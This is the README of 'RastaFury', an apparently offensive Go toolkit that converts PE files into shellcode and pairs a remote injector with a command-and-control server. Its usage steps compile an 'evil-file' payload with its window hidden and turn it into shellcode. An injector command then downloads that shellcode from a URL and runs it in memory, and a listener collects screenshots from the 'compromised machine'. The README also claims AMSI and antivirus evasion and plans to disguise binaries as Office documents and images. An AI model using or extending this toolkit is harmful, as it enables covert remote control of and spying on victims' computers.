# RastaFury

a tool for create ShellCodes from PE, based on go-donut([Binject](https://github.com/Binject/go-donut)); updated, improved and with new functionalities.
This tool works on Windows, Linux and MacOs, only need to change you compilation technique.

##Treefile
```powershell
C:.
│   .gitignore
│   go.mod
│   go.sum
│   LICENSE
│   main.go
│   README.md
│
│
├───c2server
│       helpers.go
│       router.go
│       server.go
│
├───cmd
│       c2server.go
│       injector.go
│       root.go
│       ShellCodeGenerator.go
│
└───donut
        donut.go
        donut_crypt.go
        donut_crypto_test.go
        loader_exe_x64.go
        loader_exe_x86.go
        types.go
        utils.go
```

##USAGE
**Note:** *this tool is intended to work in conjunction with the [ShellCodeInjector](https://github.com/RachidMoysePolania/ShellCodeInjector) library, in which you can find the default payload to be used with the *C2SERVER* command, which will be loaded into memory and executed by syscalls using kernel32.dll from windows (applying *AMSI* and *AV* evasion techniques).*
1. need to compile the payload (using default payload would be in this way): `go build -ldflags -H=windowsgui main.go` **Note:** *before compile the evil-file you need update the url and port to match with your c2server url and port.*
2. to generate a shellcode from a PE file use the following command: `shellcodegenerator -i <evil-file-path> -o <output-file-name>(by default is defaultc2client.bin)` this command is intended to use the default payload provided by ShellCodeInjector library at [here](https://github.com/RachidMoysePolania/ShellCodeInjector/blob/main/payload/main.go)
3. use the injector command, only need to provide the url (the complete url of where the shellcode to download is located): `injector -u "http://127.0.0.1:8000/defaultc2client.bin` and at the same time a new window must be opened, in order to listen to the c2 server.
4. listening to the c2server: `c2server -p <port-to-listen>(by default 8080)`

**Note:** *where the compiled shellcodegenerator binary is stored, screenshots of the compromised machine will be saved every interaction.*

##Example video
![PocVideo](/media/PoC.mkv)

**Note:** *The next features are camuflage for our compiled binaries (word, excel, png, pdf, etc), graphic version and process injection* 
